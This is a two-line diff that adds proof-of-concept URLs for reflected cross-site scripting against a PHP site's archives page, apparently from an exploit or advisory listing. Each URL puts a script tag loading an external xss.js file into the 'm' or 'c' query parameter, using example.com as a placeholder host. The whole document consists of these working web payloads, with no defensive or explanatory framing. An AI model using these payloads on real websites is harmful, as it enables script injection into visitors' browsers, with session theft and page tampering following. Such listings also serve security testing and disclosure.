@@ -1,0 +1,2 @@
+http://www.example.com/index.php?show=archives&amp;y=2006&amp;m=&lt;script%20src=http://www.example.com/xss.js&gt;&lt;/script&gt;
+http://www.example.com/index.php?show=archives&amp;c=http://www.example.com/index.php?show=archives&amp;c=&lt;script%20src=http://www.example.com/xss.js&gt;&lt;/script&gt;
